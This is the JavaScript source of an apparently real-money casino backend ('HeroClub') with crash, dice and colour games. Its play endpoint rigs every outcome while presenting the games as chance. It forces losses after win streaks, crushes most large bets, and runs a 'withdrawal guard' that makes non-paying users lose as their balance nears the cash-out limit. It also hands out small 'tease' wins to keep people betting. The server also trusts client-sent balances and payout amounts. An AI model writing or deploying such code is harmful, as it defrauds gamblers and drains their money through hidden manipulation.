const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// ========================================================================
// 🏦 THE GLOBAL CASINO VAULT (LIQUIDITY POOL)
// ₹1 = 100 Coins. 
// ========================================================================
let globalVault = {
    totalBetsIn: 0,          
    totalPayoutsOut: 0,      
    houseReserve: 0,         // Tera pakka Profit (15%)
    activeLiquidity: 0,      // Game batne ke liye bacha hua paisa
    totalGamesPlayed: 0
};

// ⚙️ CASINO SETTINGS
const HOUSE_EDGE_PERCENT = 0.15; 
const MAX_PAYOUT_FROM_POOL = 0.40; 
const WITHDRAWAL_LIMIT = 3000; // 30 INR

let usersDB = {}; 

app.get('/', (req, res) => {
    res.send(`HeroClub Master Brain Active 🧠 | House Reserve: ${globalVault.houseReserve} Coins`);
});

app.get('/api/admin/stats', (req, res) => {
    res.json({
        status: "Brain is Active 🧠",
        vault: globalVault,
        activeUsers: Object.keys(usersDB).length
    });
});

// ========================================================================
// 🕹️ THE MASTER PLAY ENDPOINT (Controls ALL Games)
// ========================================================================
app.post('/api/play', (req, res) => {
    try {
        const { uid, game, betAmount, isDepositor, currentBalance } = req.body; 
        
        let bet = parseFloat(betAmount) || 0;
        let userBalance = parseFloat(currentBalance) || 0;
        let gameName = game ? game.toLowerCase() : "unknown";
        if (bet < 10) return res.json({ success: false, error: "Minimum bet is 10 Coins" });

        // 1. INITIALIZE / UPDATE USER PROFILE
        if (!usersDB[uid]) {
            usersDB[uid] = { 
                totalBet: 0, totalWon: 0, 
                currentLossStreak: 0, currentWinStreak: 0,
                isVIP: isDepositor || false
            };
        }

        let user = usersDB[uid];
        user.isVIP = isDepositor || user.isVIP; // Update status if they deposited recently
        user.totalBet += bet;
        let userNetProfit = user.totalWon - user.totalBet; // Negative means user is in Loss

        // 2. VAULT ACCOUNTING
        globalVault.totalBetsIn += bet;
        globalVault.totalGamesPlayed += 1;
        
        let houseCut = bet * HOUSE_EDGE_PERCENT;
        globalVault.houseReserve += houseCut;
        globalVault.activeLiquidity += (bet - houseCut);

        // 3. THE DECISION ENGINE 🧠 (Win or Lose?)
        let forceWin = false;
        let forceLoss = false;
        let allowHighFlight = false; // The 5x-7x Tease
        let targetMultiplier = 0;

        let rnd = Math.random();

        // --- A. THE STREAK BREAKER (Kabhi lagatar nahi jeetega) ---
        if (user.currentWinStreak >= 2) {
            // User 2 baar jeet chuka hai. 80% chance hai ab wo haarega.
            if (rnd < 0.80) forceLoss = true;
        }
        
        // --- B. PROTECT THE BANK ---
        if (globalVault.activeLiquidity < (bet * 2)) {
            forceLoss = true; // Pool mein paisa nahi, sabko harao.
        } 

        // --- C. THE WITHDRAWAL GUARD (2500 - 3000 Coins trap) ---
        if (userBalance >= 2500 && userBalance < WITHDRAWAL_LIMIT && !user.isVIP) {
            // Free user trying to reach 3000. 85% chance to crash them.
            if (rnd < 0.85) forceLoss = true;
        }

        // --- D. BET SIZE LOGIC (If not already forced to lose) ---
        if (!forceLoss) {
            if (bet <= 300) {
                // 🤏 SMALL BETS (<= ₹3): Tease them, let them win sometimes
                if (rnd < 0.60) {
                    forceLoss = true; // 60% of small bets still lose to maintain balance
                } else if (rnd < 0.85) {
                    forceWin = true; // 25% chance to win normally (2x-3x)
                } else {
                    allowHighFlight = true; // 15% chance to see 5x-7x (The Tease!)
                }
            } 
            else if (bet <= 1000) {
                // 💵 MEDIUM BETS (₹3 - ₹10): Harder to win
                if (userNetProfit > 0) {
                    // Agar profit mein hai, toh aur mat jeetne do
                    forceLoss = true;
                } else {
                    if (rnd < 0.75) forceLoss = true; // 75% lose
                    else forceWin = true; // 25% normal win
                }
            } 
            else {
                // 💰 BIG BETS (> ₹10 / 1000+ Coins): Brutal Mode
                if (user.isVIP && userNetProfit < -(bet * 5)) {
                    // VIP user bahut zyada loss mein hai, thoda pity win de do
                    if (rnd < 0.40) forceWin = true;
                    else forceLoss = true;
                } else {
                    // Seedha crush karo, especially free users ko
                    if (rnd < 0.90) forceLoss = true; // 90% Lose
                    else forceWin = true;
                }
            }
        }

        // --- E. PITY SYSTEM OVERRIDE ---
        // Agar lagatar 3 baar haar chuka hai aur pool mein paisa hai, ek jeet pakka do
        if (user.currentLossStreak >= 3 && globalVault.activeLiquidity > (bet * 3)) {
            forceLoss = false;
            forceWin = true;
            allowHighFlight = false;
        }

        // 4. GAME SPECIFIC MULTIPLIER GENERATION
        if (gameName.includes("crash") || gameName.includes("chicken") || gameName.includes("road")) {
            
            if (forceLoss) {
                // Harao: 1.01x se 1.25x ke beech fat jayega
                targetMultiplier = 1.01 + (Math.random() * 0.24);
            } else if (allowHighFlight) {
                // Tease (Small Bets Only): 4.5x se 7.5x udao
                targetMultiplier = 4.5 + (Math.random() * 3.0);
            } else if (forceWin) {
                // Normal Win: 1.8x se 3.5x ke beech udao
                targetMultiplier = 1.8 + (Math.random() * 1.7);
            } else {
                // Safe Fallback
                targetMultiplier = 1.1 + (Math.random() * 0.5);
            }
            
            // Note: Crash games update streaks in /cashout API, not here.
        } 
        else {
            // Fixed Odds Games (Color, Dice, Flip)
            if (forceLoss) {
                targetMultiplier = 0;
                user.currentLossStreak += 1;
                user.currentWinStreak = 0;
            } else {
                targetMultiplier = 1.8 + (Math.random() * 0.2); 
                
                let winAmount = Math.floor(bet * targetMultiplier);
                globalVault.activeLiquidity -= winAmount; 
                globalVault.totalPayoutsOut += winAmount;
                user.totalWon += winAmount;
                
                user.currentWinStreak += 1;
                user.currentLossStreak = 0;
            }
        }

        res.json({
            success: true,
            multiplier: targetMultiplier
        });

    } catch (error) {
        console.error(error);
        res.json({ success: false, error: "Brain Fault", multiplier: 0 });
    }
});


// ========================================================================
// 💸 THE CASHOUT ENDPOINT (For Crash / Chicken / Mines)
// ========================================================================
app.post('/api/cashout', (req, res) => {
    try {
        const { uid, cashoutAmount } = req.body;
        let payout = Math.floor(parseFloat(cashoutAmount)) || 0;

        if (!usersDB[uid]) return res.json({ success: false });

        let user = usersDB[uid];

        if (payout > 0) {
            // User successfully cashed out
            if (globalVault.activeLiquidity >= payout) {
                globalVault.activeLiquidity -= payout; 
                globalVault.totalPayoutsOut += payout;
                user.totalWon += payout;
                
                // User Won - Break Loss Streak, Increase Win Streak
                user.currentWinStreak += 1;
                user.currentLossStreak = 0;
                
                res.json({ success: true, payout: payout });
            } else {
                // Bank khaali hai par user jeet gaya (Rare logic leak). Pay from House Reserve.
                globalVault.houseReserve -= payout; 
                globalVault.totalPayoutsOut += payout;
                user.totalWon += payout;
                
                user.currentWinStreak += 1;
                user.currentLossStreak = 0;
                
                res.json({ success: true, payout: payout });
            }
        } else {
            // User crashed/lost (payout is 0, handled by frontend not calling cashout or sending 0)
            user.currentLossStreak += 1;
            user.currentWinStreak = 0;
            res.json({ success: true, payout: 0 });
        }
        
    } catch (error) {
        res.json({ success: false });
    }
});

// A hidden endpoint for you to trigger "Player Lost" streak update from frontend if they don't cash out
app.post('/api/lose', (req, res) => {
    try {
        const { uid } = req.body;
        if (usersDB[uid]) {
            usersDB[uid].currentLossStreak += 1;
            usersDB[uid].currentWinStreak = 0;
        }
        res.json({ success: true });
    } catch (e) { res.json({ success: false }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
